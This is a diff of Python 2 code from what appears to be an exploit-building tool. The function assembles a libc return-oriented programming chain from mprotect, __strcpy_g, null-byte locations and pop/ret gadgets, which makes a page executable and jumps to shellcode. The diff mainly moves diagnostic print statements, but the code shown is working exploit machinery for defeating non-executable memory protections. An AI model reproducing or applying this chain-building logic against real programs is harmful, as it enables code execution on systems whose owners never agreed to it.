@@ -912,41 +912,33 @@ def build_rop_chain_libc(lib_list, buf_address, libc_path, libc_base_address):
 
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
+
     if mprotect_offset == 0:
-        print '\tUnable to find address of mprotect\t\t'
-    else:
-        print '\t[0x%x]\tAddress of mprotect\t\t' %(mprotect_offset + libc_base_address)
+        result = False
 
     strcpy_offset = get_function_address(elffile, "__strcpy_g")
     strcpy_addr = pack_value(libc_base_address + strcpy_offset)
 
     if strcpy_offset == 0:
-        print '\tUnable to find address of __strcpy_g\t\t'
-    else:
-        print '\t[0x%x]\tAddress of __strcpy_g\t\t' %(strcpy_offset + libc_base_address)
+        result = False
 
     null_byte_offset = find_null_byte(elffile)
     null_byte_location = pack_value(libc_base_address + null_byte_offset)
+
     if null_byte_offset == 0:
-        print '\tUnable to find address of null byte in .rodata\t\t'
-    else:
-        print '\t[0x%x]\tAddress of null byte\t\t' %(null_byte_offset + libc_base_address)
+        result = False
 
     temp, lib_name = find_gadget_addr(lib_list, find_pop2_ret)
-    if temp == 0:
-        print '\tUnable to find gadget pop, pop, ret;'
+    pop2_addr = pack_value(temp)
+
+    if unpack_value(pop2_addr) == 0:
         result = False
-    else:
-        pop2_addr = pack_value(temp)
-        print '\t[0x%x]\tpop, pop, ret\t\t%s' %(temp, lib_name)
 
     temp, lib_name = find_gadget_addr(lib_list, find_pop3_ret)
-    if temp == 0:
-        print '\tUnable to find gadget pop, pop, pop, ret;'
+    pop3_addr = pack_value(temp)
+
+    if unpack_value(pop3_addr) == 0:
         result = False
-    else:
-        pop3_addr = pack_value(temp)
-        print '\t[0x%x]\tpop, pop, pop, ret;\t\t%s' %(temp, lib_name)
 
     memory_start_address = ((buf_address >> 12) << 12)
     memory_length = 0x1000
@@ -971,7 +963,39 @@ def build_rop_chain_libc(lib_list, buf_address, libc_path, libc_base_address):
 
     strcpy_chain = ""
     for strcpy_da in strcpy_dest_list:
+        if strcpy_offset == 0:
+            print '\tUnable to find address of __strcpy_g\t\t'
+        else:
+            print '\t[0x%x]\tAddress of __strcpy_g\t\t' %(strcpy_offset + libc_base_address)
+
+        if unpack_value(pop2_addr) == 0:
+            print '\tUnable to find gadget pop, pop, ret;'
+        else:
+            print '\t[0x%x]\tpop, pop, ret\t\t%s' %(unpack_value(pop2_addr), lib_name)
+
+        print '\t[0x%x]\tAddress of destination byte to be replaced with null\t\t' %(strcpy_da)
+
+        if null_byte_offset == 0:
+            print '\tUnable to find address of null byte in .rodata\t\t'
+        else:
+            print '\t[0x%x]\tAddress of null byte\t\t' %(null_byte_offset + libc_base_address)
+
         strcpy_chain += strcpy_addr + pop2_addr + pack_value(strcpy_da) + null_byte_location
+
+    if mprotect_offset == 0:
+        print '\tUnable to find address of mprotect\t\t'
+    else:
+        print '\t[0x%x]\tAddress of mprotect\t\t' %(mprotect_offset + libc_base_address)
+
+    if unpack_value(pop3_addr) == 0:
+        print '\tUnable to find gadget pop, pop, pop, ret;'
+    else:
+        print '\t[0x%x]\tpop, pop, pop, ret;\t\t%s' %(unpack_value(pop3_addr), lib_name)
+
+    print '\t[0x%x]\tPage aligned address with null byte replaced by 0xff\t\t' %(memory_start_address + 0xff)
+    print '\t[%s]\tmprotect length with null byte replaced by 0xff\t\t' %(format(memory_length + 0xffff00ff, '#010x'))
+    print '\t[%s]\tPermissions - RWX with null byte replaced by 0xff\t\t' %(format(permissions + 0xffffff00, '#010x'))
+    print '\t[0x%x]\tShellcode address\t\t' %(buf_address)
 
     rop_payload = strcpy_chain + rop_payload
 
